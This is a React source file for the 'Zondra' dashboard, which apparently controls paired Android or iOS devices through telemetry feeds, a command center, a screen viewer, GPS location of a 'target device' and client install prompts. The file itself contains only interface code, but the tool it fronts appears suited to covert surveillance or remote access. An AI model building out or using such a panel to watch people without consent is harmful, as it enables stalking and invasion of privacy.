import { useState } from 'react'
import Sidebar from './components/Sidebar'
import DeviceHeader from './components/DeviceHeader'
import TelemetryFeed from './components/TelemetryFeed'
import CommandCenter from './components/CommandCenter'
import ScreenViewer from './components/ScreenViewer'
import StatsOverview from './components/StatsOverview'
import AddDeviceModal from './components/AddDeviceModal'
import { InstallModal } from './components/InstallModal'
import { useTelemetry } from './hooks/useFirestore'
import { useDeviceList } from './hooks/useDevices'

// ─── Location Page ─────────────────────────────────────────────────────────────
function LocationPage({ device }: { device: any }) {
  return (
    <div style={{ height: '100%', display: 'flex', flexDirection: 'column', gap: 20 }}>
      <div>
        <h2 style={{ fontSize: 16, fontWeight: 700, color: '#e2e8f0', marginBottom: 4 }}>Location Tracker</h2>
        <p style={{ fontSize: 12, color: '#475569' }}>GPS coordinates from target device</p>
      </div>
      <div style={{ flex: 1, borderRadius: 16, overflow: 'hidden', border: '1px solid rgba(255,255,255,0.06)', background: '#0d1520', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ textAlign: 'center', color: '#334155' }}>
          <div style={{ fontSize: 48, marginBottom: 16 }}>📍</div>
          <p style={{ fontSize: 15, fontWeight: 600, color: '#475569' }}>{device?.location ?? 'No GPS data yet'}</p>
          <p style={{ fontSize: 12, color: '#334155', marginTop: 6 }}>Location is pushed by the Android client via WorkManager</p>
        </div>
      </div>
    </div>
  )
}

// ─── Settings Page ─────────────────────────────────────────────────────────────
function SettingsPage() {
  return (
    <div style={{ maxWidth: 540 }}>
      <h2 style={{ fontSize: 16, fontWeight: 700, color: '#e2e8f0', marginBottom: 4 }}>Settings</h2>
      <p style={{ fontSize: 12, color: '#475569', marginBottom: 28 }}>Configure your Zondra deployment</p>
      {[
        { label: 'Firebase Project ID', value: 'think-big-f8c31' },
        { label: 'AES-256 Key (set via VITE_AES_KEY env)', value: '••••••••••••••••••••••••••••••••', type: 'password' },
        { label: 'Admin Email', value: 'admin@zondra.internal' },
        { label: 'Alert Webhook URL', value: 'https://hooks.slack.com/...' },
      ].map(field => (
        <div key={field.label} style={{ marginBottom: 18 }}>
          <label style={{ fontSize: 12, color: '#64748b', display: 'block', marginBottom: 6, fontWeight: 500 }}>{field.label}</label>
          <input
            type={field.type ?? 'text'}
            defaultValue={field.value}
            style={{ width: '100%', padding: '10px 14px', borderRadius: 8, background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)', color: '#cbd5e1', fontSize: 13, outline: 'none' }}
          />
        </div>
      ))}
      <button style={{ marginTop: 8, padding: '10px 24px', borderRadius: 8, background: 'rgba(59,130,246,0.15)', border: '1px solid rgba(59,130,246,0.3)', color: '#60a5fa', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>
        Save Configuration
      </button>
    </div>
  )
}

// ─── Empty State when no devices ──────────────────────────────────────────────
function NoDevicesState({ onAdd }: { onAdd: () => void }) {
  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 16, color: '#334155' }}>
      <div style={{ fontSize: 56 }}>📱</div>
      <h2 style={{ fontSize: 18, fontWeight: 700, color: '#475569' }}>No devices connected</h2>
      <p style={{ fontSize: 13, color: '#334155', textAlign: 'center', maxWidth: 340 }}>
        Click "Add Device" to generate a pairing token, then enter it in the Android app.
      </p>
      <button
        onClick={onAdd}
        style={{ padding: '10px 24px', borderRadius: 10, background: 'rgba(59,130,246,0.15)', border: '1px solid rgba(59,130,246,0.3)', color: '#60a5fa', fontSize: 14, fontWeight: 600, cursor: 'pointer' }}
      >
        + Add First Device
      </button>
    </div>
  )
}

// ─── Main App ─────────────────────────────────────────────────────────────────
export default function App() {
  const { devices, loading: devicesLoading, addDevice, removeDevice } = useDeviceList()
  const [activeDeviceId, setActiveDeviceId] = useState<string>('')
  const [activePage, setActivePage] = useState('dashboard')
  const [showAddModal, setShowAddModal] = useState(false)
  const [installPlatform, setInstallPlatform] = useState<'android' | 'ios' | null>(null)

  // Auto-select first device when list loads
  const resolvedDeviceId = activeDeviceId || devices[0]?.id || ''
  const { logs, loading: telLoading } = useTelemetry(resolvedDeviceId)
  const activeDevice = devices.find(d => d.id === resolvedDeviceId)

  const handleAddDevice = async (newDev: { id: string; name: string; token: string }) => {
    await addDevice(newDev.id, newDev.name, newDev.token)
    setActiveDeviceId(newDev.id)
  }

  const handleRemoveDevice = async (id: string) => {
    await removeDevice(id)
    if (resolvedDeviceId === id) setActiveDeviceId('')
  }

  const renderContent = () => {
    if (devicesLoading) {
      return (
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#334155' }}>
          <div className="shimmer" style={{ width: 220, height: 20, borderRadius: 8 }} />
        </div>
      )
    }

    if (devices.length === 0) return <NoDevicesState onAdd={() => setShowAddModal(true)} />

    switch (activePage) {
      case 'dashboard':
        return (
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 380px', gap: 24, height: '100%' }}>
            <StatsOverview logs={logs} loading={telLoading} />
            <TelemetryFeed logs={logs} loading={telLoading} />
          </div>
        )
      case 'telemetry':  return <TelemetryFeed logs={logs} loading={telLoading} />
      case 'commands':   return <CommandCenter deviceId={resolvedDeviceId} />
      case 'screen':     return <ScreenViewer deviceId={resolvedDeviceId} />
      case 'map':        return <LocationPage device={activeDevice} />
      case 'settings':   return <SettingsPage />
      default:           return null
    }
  }

  return (
    <div style={{ display: 'flex', height: '100vh', width: '100vw', overflow: 'hidden', background: '#080b11' }}>
      {showAddModal && (
        <AddDeviceModal onClose={() => setShowAddModal(false)} onAdd={handleAddDevice} />
      )}
      {installPlatform && (
        <InstallModal platform={installPlatform} onClose={() => setInstallPlatform(null)} />
      )}

      <Sidebar
        devices={devices}
        activeDeviceId={resolvedDeviceId}
        onSelectDevice={setActiveDeviceId}
        activePage={activePage}
        onNavigate={setActivePage}
        onAddDevice={() => setShowAddModal(true)}
        onRemoveDevice={handleRemoveDevice}
        onInstall={setInstallPlatform}
      />

      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        {activeDevice && <DeviceHeader device={activeDevice} />}

        {!activeDevice && devices.length > 0 && !devicesLoading && (
          <div style={{ padding: '12px 24px', background: 'rgba(245,158,11,0.08)', borderBottom: '1px solid rgba(245,158,11,0.15)', fontSize: 12, color: '#fbbf24' }}>
            ⚠ Select a device from the sidebar to view telemetry
          </div>
        )}

        <div style={{ flex: 1, overflow: 'auto', padding: 24, display: 'flex', flexDirection: 'column' }}>
          {renderContent()}
        </div>
      </div>
    </div>
  )
}
